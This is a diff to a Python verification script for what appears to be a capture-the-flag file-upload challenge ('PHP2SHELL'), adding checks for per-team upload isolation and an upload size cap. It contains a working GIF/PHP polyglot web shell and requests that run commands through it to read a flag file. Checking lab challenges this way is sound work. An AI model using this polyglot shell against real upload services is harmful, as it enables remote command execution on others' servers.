@@ -69,15 +69,55 @@ def test_polyglot_exploit(base_url):
         print(f"[-] Command output did not contain expected flag: {exec_resp.text}")
         return False
 
-    # Also verify fallback un-prefixed URL works for legacy scripts
+    # Isolation invariant: the un-prefixed name must NOT resolve. Only the
+    # uuid-prefixed link handed back to this team may serve the shell.
     fallback_url = f"{base_url}/uploads/polyglot_shell.phtml?cmd=cat%20/flag.txt"
     fb_resp = requests.get(fallback_url, timeout=5)
-    if EXPECTED_FLAG in fb_resp.text:
-        print(f"[+] Legacy fallback URL verified successfully.")
+    if fb_resp.status_code == 404:
+        print("[+] Un-prefixed fallback correctly disabled (multi-team isolation).")
         return True
     else:
-        print(f"[-] Fallback URL did not resolve flag: {fb_resp.text}")
+        print(f"[-] Isolation broken: /uploads/polyglot_shell.phtml returned {fb_resp.status_code}.")
         return False
+
+
+def test_team_isolation(base_url):
+    print("[*] Verifying two teams uploading the same filename stay isolated...")
+    payload = b"GIF89a;\n<?php system($_GET['cmd']); ?>"
+    links = []
+    for _ in range(2):
+        files = {"submission": ("shared_shell.phtml", payload, "image/gif")}
+        resp = requests.post(f"{base_url}/upload", files=files, timeout=5)
+        match = re.search(r'href="(/uploads/[^"]+)"', resp.text)
+        if not match:
+            print("[-] Upload did not return an isolated access link.")
+            return False
+        links.append(match.group(1))
+
+    if links[0] == links[1]:
+        print(f"[-] Same-filename uploads collided on {links[0]}.")
+        return False
+
+    for link in links:
+        resp = requests.get(f"{base_url}{link}?cmd=cat%20/flag.txt", timeout=5)
+        if EXPECTED_FLAG not in resp.text:
+            print(f"[-] Isolated link {link} no longer resolves its own shell.")
+            return False
+
+    print(f"[+] Distinct isolated links verified: {links[0]} / {links[1]}")
+    return True
+
+
+def test_size_cap(base_url):
+    print("[*] Verifying upload size cap (3 MiB payload)...")
+    oversized = b"GIF89a;" + b"A" * (3 * 1024 * 1024)
+    files = {"submission": ("huge.phtml", oversized, "image/gif")}
+    resp = requests.post(f"{base_url}/upload", files=files, timeout=15)
+    if resp.status_code == 413 or "Payload Too Large" in resp.text:
+        print("[+] Oversized upload rejected with 413.")
+        return True
+    print(f"[-] Size cap not enforced (HTTP {resp.status_code}).")
+    return False
 
 def main():
     base_url = sys.argv[1] if len(sys.argv) > 1 else TARGET_BASE
@@ -86,8 +126,10 @@ def main():
     ok1 = test_blocked_extension(base_url)
     ok2 = test_signature_check(base_url)
     ok3 = test_polyglot_exploit(base_url)
+    ok4 = test_team_isolation(base_url)
+    ok5 = test_size_cap(base_url)
 
-    if ok1 and ok2 and ok3:
+    if ok1 and ok2 and ok3 and ok4 and ok5:
         print("\n[SUCCESS] PHP2SHELL verification checks passed cleanly (Exit 0).")
         sys.exit(0)
     else:
